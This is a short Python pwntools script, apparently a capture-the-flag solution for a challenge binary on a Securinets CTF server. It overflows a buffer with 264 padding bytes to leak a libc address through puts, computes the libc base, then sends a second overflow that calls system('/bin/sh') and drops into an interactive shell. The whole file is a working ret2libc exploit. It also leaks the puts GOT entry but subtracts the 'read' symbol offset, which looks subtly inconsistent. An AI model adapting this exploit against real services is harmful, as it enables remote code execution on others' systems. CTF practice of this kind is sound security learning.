from pwn import * 
from time import * 
libc=ELF("/home/kali/Desktop/libc.so.6")
#p=process("./hethi")
p=remote("pwn.ctf.securinets.tn",5003)
puts_plt=0x0000000000401090
puts_got=0x404028

p.sendline("1")
p.sendline(b"a"*264+p64(puts_plt)+b"a"*8+p64(puts_got))
sleep(0.1)
p.sendline("2")
'''
print(p.recvline())
print(p.recvline())
print(p.recvline())
'''

p.recvuntil("3\n")
leak=u64(p.recv(6)+b"\x00"*2)
print(hex(leak))

libc.address=leak-libc.symbols["read"]
system=libc.symbols["system"]
binsh=next(libc.search(b"/bin/sh"))
sleep(0.1)
p.sendline("1")
p.sendline(b"a"*264+p64(system)+b"a"*8+p64(binsh))
sleep(0.1)
p.sendline("2")

p.interactive()
